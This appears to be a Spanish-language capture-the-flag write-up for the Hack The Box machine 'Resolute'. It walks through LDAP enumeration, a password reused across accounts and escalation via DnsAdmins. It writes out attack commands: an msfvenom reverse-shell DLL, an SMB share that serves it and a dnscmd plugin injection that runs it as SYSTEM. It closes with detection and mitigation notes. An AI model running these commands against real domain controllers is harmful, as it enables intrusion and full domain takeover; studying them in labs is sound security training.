---
machine: Resolute
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory
state: Retired
pwned: 2026-11-09
tags: [windows, active-directory, ldap, dnsadmins, dnscmd, privesc]
---

# Resolute — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

LDAP anónimo expone en el campo `description` la contraseña de un usuario, que además está reutilizada. Con WinRM se entra y BloodHound muestra pertenencia a **`DnsAdmins`**: se carga una DLL arbitraria en el servicio DNS con `dnscmd` y se ejecuta como `SYSTEM`.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <TARGET_IP>
```

| Puerto | Servicio |
|---|---|
| 53/tcp | DNS |
| 88/tcp | Kerberos |
| 389/636 | LDAP |
| 445/tcp | SMB |
| 5985/tcp | WinRM |

## Enumeración

```bash
ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=megabank,DC=local' '(objectClass=user)' sAMAccountName description
rpcclient -U '' -N <TARGET_IP> -c 'enumdomusers'
```

El campo `description` de `melanie` contiene una contraseña. Se prueba en el resto de cuentas y aparece reutilizada en `ryan`, que está en `Remote Management Users`.

```bash
nxc smb <TARGET_IP> -u melanie -p '<password>'
nxc winrm <TARGET_IP> -u ryan -p '<password>'
```

## Foothold

```bash
evil-winrm -i <TARGET_IP> -u ryan -p '<password>'
type C:\Users\ryan\Desktop\user.txt
whoami /groups | findstr -i dns
```

## Escalada: DnsAdmins

El grupo `DnsAdmins` permite indicar al servicio DNS una DLL que carga como `SYSTEM` al arrancar:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o evil.dll
impacket-smbserver share . -smb2support
```

Desde WinRM:

```cmd
dnscmd <DC> /config /serverlevelplugindll \\<LHOST>\share\evil.dll
sc stop dns
sc start dns
```

Al reiniciar el servicio, la DLL se carga como `SYSTEM`; la reverse shell vuelve a tu listener.

## Errores típicos

- **`dnscmd` no encontrado** → no está en el PATH; usa `C:\Windows\System32\dnscmd.exe`.
- **`Access is denied` al configurar** → no eres miembro de `DnsAdmins` o el DC no es el mismo host.
- **La DLL no se carga** → el servicio no reinició; `sc stop dns` puede fallar y hay que usar `Restart-Service DNS`.
- **SMB bloqueado** → publica la DLL por HTTP y usa una ruta UNC accesible o copia local.
- **El plugin persiste** → `/serverlevelplugindll` queda configurado; hay que limpiarlo (`dnscmd /config /serverlevelplugindll ""`) y reiniciar.

## Detección y mitigación

- **5136** sobre el objeto del servidor DNS y **7045**/cambios de configuración del servicio.
- **5145** al share con la DLL y **4624** tipo 3 desde el DC hacia el atacante.
- Sacar `DnsAdmins` a quien no lo necesite; el grupo es equivalente a admin del DC.
- Revisar `serverlevelplugindll` y bloquear UNC salientes desde DCs.

MITRE: T1543.003, T1055, T1078.
